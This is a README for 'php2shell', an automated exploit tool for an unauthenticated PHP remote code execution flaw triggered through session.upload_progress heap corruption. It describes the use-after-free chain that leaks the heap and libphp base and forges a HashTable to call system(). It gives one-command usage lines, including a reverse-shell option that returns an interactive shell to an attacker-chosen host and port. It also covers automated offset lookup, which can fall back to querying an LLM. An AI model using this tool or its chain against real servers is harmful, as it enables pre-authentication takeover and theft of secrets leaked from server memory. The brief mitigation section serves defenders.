# php2shell (reverse optimized)

Automated **PHP2Shell** exploit — CVE-2026-109618 / CVE-2026-109619,
unauthenticated RCE in the PHP engine via `session.upload_progress`
heap corruption (CVSS 4.0: 9.2). One command from a single URL:
recon → preflight gates → offset resolution → engine run → interactive
reverse shell handed back to the client.

Developed by [@luizfernandoziron](https://github.com/luizfernandoziron) /
[@zr0n](https://github.com/zr0n) — https://instagram.com/luizfernandoziron

> Authorized security testing only.

## Vulnerability

`session.upload_progress` (enabled by default since PHP 5.4) makes the
engine handle a multipart POST **before any application code runs** — fully
pre-auth. Internally, `php_session_rfc1867_callback()` caches raw
`zval`/HashTable pointers in `PS(id)`, `PS(mod_data)` and
`PS(http_session_vars)`.

A fatal error mid-upload — usually **OOM** by exceeding `memory_limit` —
aborts the request via `zend_bailout()` **without cleanup**: the session
HashTable and request globals are freed while the cached pointers remain.
The next request served by the same worker (mod_php/prefork) touches that
freed memory:

- **CVE-2026-109619** — stale global state → **use-after-free**. The
  dangling session-ID pointer also leaks heap memory (~800 KB) through the
  response cookie (ASLR bypass; can expose tokens/keys from other requests).
- **CVE-2026-109618** — OOM corruption → code execution: a fake HashTable
  sprayed into the freed slot sets `pDestructor` to `zif_system` (or a
  write-what-where gadget overwriting `PG(auto_prepend_file)` in BSS).

Fixed in **PHP 8.5.12 / 8.4.27 / 8.3.36 / 8.2.35**. Everything older is
affected.

## The chain

```
0  worker rotation — abort one prefork child so the next worker starts clean
1  heap leak      — OOM leaves PS(id)/PS(http_session_vars) dangling;
                    out-of-bounds read leaks the Zend MM chunk base
                    via Set-Cookie
2  libphp leak    — forged zend_string length exposes pDestructor
                    = ZVAL_PTR_DTOR -> libphp base (ASLR defeated)
3  RCE             — fake HashTable with pDestructor = zif_system
                    -> system(cmd)
```

## Usage

```bash
# full chain, one command (lab: proof lands in lab/out/p)
python3 php2shell.py -u http://TARGET/index.php -c 'id>/out/p' --proof-file lab/out/p

# passive / active recon only
python3 php2shell.py -u http://TARGET/index.php --recon-only
python3 php2shell.py -u http://TARGET/index.php --preflight-only

# offsets from a local libphp.so / docker container
python3 php2shell.py -u http://TARGET/index.php --libphp ./libphp.so -c id
python3 php2shell.py -u http://TARGET/index.php --container NAME -c id

# manual offsets + engine selection
python3 php2shell.py -u http://TARGET/index.php \
    --zif-offset 0x465370 --dtor-offset 0x65eb60 --htdata-offset 0x690d8 -c id
python3 php2shell.py -u http://TARGET/index.php --engine 3em0 -c id

# reverse shell — the client receives the shell interactively
# (lab: payload staged via the lab/out mount; banner + commands come back live)
python3 php2shell.py -u http://TARGET/index.php --reverse 5555
python3 php2shell.py -u http://TARGET/index.php --reverse LHOST:LPORT \
    --stage-host lab/out/c --stage-target /out/c

# bundled offset database
python3 php2shell.py --list-offsets
```

## Offset automation

Resolution order when a target is passed:

1. `--zif-offset` / `--dtor-offset` / `--htdata-offset`
2. `--libphp <file.so>` (ELF symbol extraction)
3. `--container <name>` (docker cp + ELF extraction)
4. bundled DB (13 known builds: docker-official, sury Debian/Ubuntu, arm64)
5. web lookup (public offset tables: Chr1s-T, 3em0)
6. LLM (optional — set `DEEPSEEK_API_KEY` and the last resort asks DeepSeek
   for the build offsets)

Gates (from field research, enforced before firing): PHP
< 8.5.12/8.4.27/8.3.36/8.2.35, Apache mod_php/prefork,
`display_errors=On` (required for the stage-1 heap leak), reachable
`memory_limit` OOM, x86-64. The chain is verified on PHP 8.3–8.5.

## Repository layout

```
php2shell.py      orchestrator: recon + gates + offsets + engine dispatch
check.py          preflight checker (Chr1s-T)
poc.py            UAF engine, field-hardened (Chr1s-T)
exploit.py        UAF engine, profile-based (3em0)
exploit_v2.py     UAF engine v2, auto_prepend_file techniques (JoasASantos)
lib/              payload/leak/calibration helpers (JoasASantos)
profiles/         per-build offset+staging profiles (JoasASantos)
```

## Mitigation

Upgrade PHP (the only complete fix). Partial mitigation:
`session.upload_progress.enabled = 0` + restart workers. If a vulnerable
worker was exposed, rotate secrets (the memory-leak path exposes
passwords/tokens/keys).

## Credits

- Authors: [@luizfernandoziron](https://github.com/luizfernandoziron) /
  [@zr0n](https://github.com/zr0n)
- Instagram: <https://instagram.com/luizfernandoziron>
- Chain basis: [9bie/php2shell-bypass-aslr-exp](https://github.com/9bie/php2shell-bypass-aslr-exp),
  [Chr1s-T/php2shell-cve-2026-109618](https://github.com/Chr1s-T/php2shell-cve-2026-109618),
  [3em0/php2shell](https://github.com/3em0/php2shell),
  [JoasASantos/php2shell-exploit](https://github.com/JoasASantos/php2shell-exploit)
- Wiz Research: <https://www.wiz.io/blog/php2shell>
